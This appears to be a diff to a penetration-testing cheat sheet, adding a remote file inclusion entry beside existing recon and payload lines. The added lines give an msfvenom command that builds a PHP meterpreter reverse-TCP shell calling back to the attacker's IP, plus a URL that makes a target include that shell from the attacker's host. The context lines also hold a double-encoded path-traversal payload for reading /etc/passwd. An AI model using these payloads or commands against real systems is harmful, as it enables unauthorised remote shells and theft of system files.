@@ -376,6 +376,11 @@ document.cookie="SESSIONID=12345;%20path=/;
 echo http://example.gov | waybackurls | grep /images/
 
 # Double Encode Payload: "www.example.com/images/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"   >> in repeater
+
+RFI
+msfvenom -p php/meterpreter_reverse_tcp LHOST=MYIP LPORT=<PORT> -f raw>shell.txt 
+and go to target target/dir/?page=http://myip/shell.txt
+
   
 ----------------------------------------------------------------------------------------------
 nmap -sV -iL host.txt -oN nmap_scan.txt
